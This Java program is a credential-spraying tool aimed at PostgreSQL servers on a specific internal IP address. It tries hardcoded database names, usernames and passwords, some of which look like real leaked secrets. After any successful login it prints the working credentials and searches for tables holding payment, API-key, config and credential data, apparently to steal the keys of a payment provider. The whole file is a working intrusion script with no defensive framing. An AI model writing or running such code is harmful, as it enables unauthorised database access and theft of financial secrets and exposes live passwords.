import java.sql.*;
class XM2 {
  public static void main(String[] a) throws Exception {
    Class.forName("org.postgresql.Driver");
    // Try connecting to nucleus database on same server
    String[] dbs = {"nucleus","accurate","jupiter","venus","neptune","mercury","noxify"};
    String[] passes = {"BJwx+sAC6jreaV45","kutul0nc4t","postgres","atlassian"};
    String[] users = {"neo","nucleus","accurate","postgres"};
    for(String db : dbs) {
      for(String user : users) {
        for(String pass : passes) {
          try {
            Connection c = DriverManager.getConnection("jdbc:postgresql://10.13.17.248:5501/"+db,user,pass);
            System.out.println("DB_OK: "+db+" user="+user+" pass="+pass);
            Statement s = c.createStatement();
            // Search for xendit tables
            ResultSet r = s.executeQuery("SELECT tablename FROM pg_tables WHERE schemaname='public' AND (tablename LIKE '%xendit%' OR tablename LIKE '%payment%' OR tablename LIKE '%api_key%' OR tablename LIKE '%config%' OR tablename LIKE '%credential%' OR tablename LIKE '%application%') ORDER BY tablename");
            while(r.next()) System.out.println("  TABLE: "+r.getString(1));
            c.close();
            break;
          } catch(Exception e) {}
        }
      }
    }
  }
}
